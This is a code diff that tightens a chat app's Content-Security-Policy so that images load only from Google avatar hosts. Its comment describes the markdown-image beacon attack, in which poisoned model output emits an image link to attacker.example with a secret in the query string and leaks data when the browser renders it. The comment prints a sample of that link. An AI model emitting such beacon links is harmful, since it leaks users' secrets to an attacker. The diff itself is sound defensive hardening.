@@ -33,8 +33,25 @@ const CSP = [
   "script-src 'self' https://apis.google.com https://www.gstatic.com https://www.google.com",
   "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
   "font-src 'self' https://fonts.gstatic.com",
-  // https: for Google account profile photos; data: for inlined icons.
-  "img-src 'self' data: https:",
+  // Narrowed from `https:` deliberately, and this is the most security-relevant
+  // line in the file.
+  //
+  // The headline attack against this app is the markdown-image beacon: poisoned
+  // model output emits `![](https://attacker.example/x?d=SECRET)`, the browser
+  // fetches it on paint, and the query string carries data out. No tool call,
+  // no capability, no grant.
+  //
+  // INV-9 stops it in the renderer, which never emits an <img> at all. But
+  // `img-src https:` meant that if the renderer ever regressed — someone
+  // reaches for a markdown library to get prettier chat bubbles — the browser
+  // would happily make that request and there was nothing behind it. A defence
+  // with no second layer under the project's own headline threat.
+  //
+  // The only external image the app actually loads is the signed-in user's
+  // Google avatar, so the allowance is exactly that. An attacker cannot
+  // exfiltrate through googleusercontent.com either: they can host an image
+  // there, but the query string never reaches a server they control.
+  "img-src 'self' data: https://*.googleusercontent.com",
   // The Firebase/Google origins the client actually talks to. Gemini is called
   // server-side only, so no model origin appears here.
   "connect-src 'self' https://*.googleapis.com https://*.firebaseio.com " +
